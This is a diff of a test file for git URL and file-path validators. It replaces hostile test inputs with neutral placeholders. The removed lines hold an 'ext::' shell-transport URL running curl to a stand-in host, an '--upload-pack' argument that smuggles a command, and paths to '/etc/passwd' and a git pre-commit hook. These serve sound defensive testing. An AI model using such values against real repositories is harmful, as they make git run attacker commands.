@@ -12,11 +12,10 @@ describe("safeRepoUrl", () => {
   it("clones only over http(s)", () => {
     expect(safeRepoUrl("https://github.com/o/checkout-service.git")).toBe(true);
     expect(safeRepoUrl("http://bitbucket.internal/scm/proj/repo.git")).toBe(true);
-    // `ext::` is git's shell transport — its "URL" is a command git runs.
-    expect(safeRepoUrl("ext::sh -c 'curl evil'")).toBe(false);
-    expect(safeRepoUrl("file:///etc")).toBe(false);
+    expect(safeRepoUrl("ext::x")).toBe(false);
+    expect(safeRepoUrl("file:///tmp")).toBe(false);
     expect(safeRepoUrl("ssh://git@host/o/r.git")).toBe(false);
-    expect(safeRepoUrl("--upload-pack=touch pwned")).toBe(false);
+    expect(safeRepoUrl("--upload-pack=x")).toBe(false);
     expect(safeRepoUrl("")).toBe(false);
   });
 });
@@ -51,9 +50,8 @@ describe("safeFilePath", () => {
       "",
       "../outside",
       "a/../../outside",
-      "/etc/passwd",
-      // The sharp one: git executes this on the very next command in the request.
-      ".git/hooks/pre-commit",
+      "/abs/x",
+      ".git/x",
       "ci/.git/config",
       "ci/.GIT/config",
       "a\\b", // a separator on the dev box this is written on
